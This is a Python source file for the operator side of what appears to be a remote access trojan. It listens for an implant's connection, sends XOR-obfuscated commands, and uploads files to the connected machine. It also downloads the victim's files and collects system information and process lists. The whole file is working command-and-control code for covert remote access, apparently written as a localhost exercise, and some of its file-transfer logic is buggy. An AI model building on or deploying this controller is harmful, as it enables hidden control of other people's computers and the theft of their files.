import socket, select, os

HOST = '127.0.0.1'
PORT = 25565

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #establishing sockets
sock.bind((HOST, PORT))
sock.listen(1)

options = """ 

Commands:

help
upload
download
processes
systeminfo
end

"""

OPTIONS = ["upload", "download", "systeminfo", "processes", "help", "end"] #available commands

def xor(msg):
    newMsg = "" # init empty string
    for char in msg:
        decrChar = ord(str(char)) ^ ord('+') # compute xor for ascii value of char and +
        newMsg += str(chr(decrChar)) # append to new newMessage
    return str.encode(newMsg) # return result in bytes

def receiveMsg(conn, filePath=None):  # receive a variable length message and print it / download
    recv = conn.recv(8).decode()  # recieve incoming message length (up to 8 hex digits)
    print(f"message length encoded: {recv}")  # print decoded recieved data
    msg = xor(recv)  # decode the message received
    # turn message length into hex (message may be padded with 'P') 
    msgLen = int(msg, 16)  # turn msgLen into hex int
    print(f"message length (base 10): {msgLen}")
    if filePath is None:
        print("message decoded:\n")
        
        #totMsg = b''  # initialize total message storage variable
        
        while msgLen > 0: # when message length is less than 0, stop recieving
            if msgLen < 1024:  # if message length is less than 1024, only recieve the rest of the message
                recv = conn.recv(msgLen).decode()
                msg = xor(recv)
            else:  # otherwise recieve 1024 bytes at a time
                recv = conn.recv(1024).decode()  # receive 1024 bytes
                msg = xor(recv)  # xor decode 1024 bytes
                
            print(f"{msg.decode()}", end="")
            #totMsg += msg  # append bytes to total message storage variable
            msgLen = msgLen - 1024  # decrement message length
    else:  # if filepath is included
        if msgLen == 1:
            print(f"Client error creating file: {filePath}")
        else:
            with open(filePath, 'wb') as file:
                while msgLen > 0: # when message length is less than 0, stop recieving
                    if msgLen < 1024:  # if message length is less than 1024, only recieve the rest of the message
                        recv = conn.recv(msgLen).decode()
                        msg = xor(recv)
                        file.write(msg)
                    else:  # otherwise recieve 1024 bytes at a time
                        recv = conn.recv(1024).decode()  # receive 1024 bytes
                        msg = xor(recv)  # xor decode 1024 bytes
                        file.write(msg)
                    #totMsg += msg  # append bytes to total message storage variable
                    msgLen = msgLen - 1024  # decrement message length
                print(f"File {filePath} received successfully")
        
    #return totMsg  # return total message decrypted bytes
        
def main():
    while True: 
        print("Accepting...")
        conn, addr = sock.accept() # Accept incoming connection and get client's address
        print ('Connection from ' + str(addr))

        while True: #beggining of accepting input
            print(options)
            userInput = input(">> ")
            command = userInput.split(' ')
            if command[0] not in OPTIONS: #validate user input
                print(f"\n'{command[0]}' is not a valid command.\n")
            elif command[0].lower() == "end": # if input is end close connection
                conn.sendall(xor("end")) # send encrypted end to client
                conn.shutdown(socket.SHUT_RDWR) #shutdown socket for reading and writing
                conn.close()
                break            
            elif command[0].lower() == "upload":
                # syntax: upload client/file/path local/file/path
                # file will go to client's  current working directory
                print("Sending upload command") # debug
                if len(command) != 3: #check if number args provided is correct
                    print("Incorrect upload syntax, use two arguments.")
                    continue

                userInput = xor(command[0].lower()) #encrpyt user input commmand
                conn.sendall(userInput) #send encrypted command to client

                sourcePath = command.pop(1) #get src file path from user input
                
                #fileSize = os.stat(sourcePath).st_size #get file size
                #fileSizeStr = str(fileSize).zfill(10) #file size -> string and pad with zeros
                #print(fileSizeStr)
                #print(f"Filesize of file to upload is: {fileSizeStr}")
                #userInput = xor("{fileSizeStr}") #encrypt filesize with pad
                #conn.sendall(userInput) #send encrypted file to client

                with open(sourcePath, 'rb') as file: #open src file in binary mode
                    conn.sendall(xor(file.read()))
                    
                conn.recv(1024) # get confirmation if file was recieved
            
            elif command[0].lower() == "download" :
                # syntax: download client/file/path local/file/path
                # file will go to server's current working directory

                if len(command) != 3: #check if number args provided is correct
                    print("Incorrect download syntax, use two arguments.")
                    continue
                
                userInput = xor(command[0].lower()) #encrpyt user input commmand
                conn.sendall(userInput) #send encrypted command to client
                
                userInput = xor(command[1].lower()) # encrypt filepath
                conn.sendall(userInput) # send name of file desired for download
                
                destPath = command.pop(1)
                print(f"Writing file to {destPath}\n")
                receiveMsg(conn, destPath)
                ## with open(destPath, 'wb') as file:
                ##    while True:
                ##        filedata = sock.recv(1024)
                ##        if not filedata:
                ##            break
                ##        file.write(filedata)
                ##    print(f"File {destPath} received successfully")
                ## break
            elif command[0].lower() == "systeminfo" or command[0].lower() == "processes":  # processes and systeminfo use the same receive function
                userInput = xor(command[0].lower())  # xor user input
                conn.sendall(userInput)  # send xor'd user input
                receiveMsg(conn)
                    
            elif "help" in command[0].lower():
                print(options)
            
if __name__ == "__main__":
    main()